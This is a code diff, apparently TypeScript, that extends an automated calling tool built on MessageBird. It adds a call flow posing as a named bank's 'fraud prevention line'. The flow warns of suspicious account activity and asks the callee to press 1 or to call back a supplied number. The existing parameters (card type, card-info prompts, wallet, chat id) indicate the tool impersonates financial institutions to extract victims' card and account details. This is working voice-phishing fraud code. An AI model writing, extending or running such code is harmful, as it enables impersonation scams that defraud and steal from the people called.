@@ -16,6 +16,7 @@ interface CallInputType {
   wallet?: string;
   cardType?: string;
   askCardInfo?: string;
+  transferNumber: string;
 }
 
 const callFlow = (
@@ -26,6 +27,8 @@ const callFlow = (
   wallet?: string,
   cardType?: string,
   askCardInfo?: string,
+  transferNumber?: string,
+  from?: string,
 ): CallFlowParameter => {
   switch (step) {
     case 'bank':
@@ -204,6 +207,63 @@ const callFlow = (
           },
         ],
       };
+    case 'pgp':
+      return {
+        id: uuidv4(),
+        title: `Calling - ${chatId}`,
+        record: false,
+        steps: [
+          {
+            id: uuidv4(),
+            action: 'say',
+            options: {
+              ifMachine: 'delay',
+              payload: `Welcome to the ${institutionName} fraud prevention line. We recently notice a suspicious activity on your account, if this was you simply hang up. If this was not you please press 1 to speak to a ${institutionName} representative to better assist you in securing your account.`,
+              language: 'en-us',
+              voice: 'female',
+              length: 5,
+              // @ts-expect-error ts does not recognise loop
+              loop: true,
+            },
+            onKeypressGoto: 'nextStep',
+            onKeypressVar: 'dtmf',
+          },
+          {
+            // @ts-expect-error ts does not recognise id
+            id: uuidv4(),
+            action: 'pause',
+            options: {
+              length: 5,
+            },
+            onKeypressGoto: 'nextStep',
+            onKeypressVar: 'dtmf',
+          },
+          {
+            // @ts-expect-error ts does not recognise id
+            id: uuidv4(),
+            action: 'say',
+            options: {
+              payload: `We are sorry we missed you, there is a urgent matter in regards to a recent activities on your ${institutionName}  your account. Please Call us back to speak with a bank specialist regarding this matter on ${transferNumber
+                ?.split('')
+                .join(' ')}`,
+              language: 'en-us',
+              voice: 'female',
+              length: 5,
+            },
+          },
+          {
+            action: 'hangup',
+          },
+          {
+            // @ts-expect-error ts does not recognise id
+            id: 'nextStep',
+            action: 'fetchCallFlow',
+            options: {
+              url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?transferNumber=${transferNumber}&from=${from}`,
+            },
+          },
+        ],
+      };
     default:
       return {
         // @ts-expect-error id is indeed known param
@@ -227,6 +287,7 @@ export const messagebirdMakeACall: any = async ({
   cardType,
   askCardInfo,
   chatId,
+  transferNumber,
 }: CallInputType) => {
   const flow =
     /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
@@ -240,6 +301,8 @@ export const messagebirdMakeACall: any = async ({
           wallet,
           cardType,
           askCardInfo,
+          transferNumber,
+          from,
         )
       : callFlow(
           institutionName,
@@ -249,6 +312,8 @@ export const messagebirdMakeACall: any = async ({
           wallet,
           cardType,
           askCardInfo,
+          transferNumber,
+          from,
         );
 
   return messagebird.calls.create(
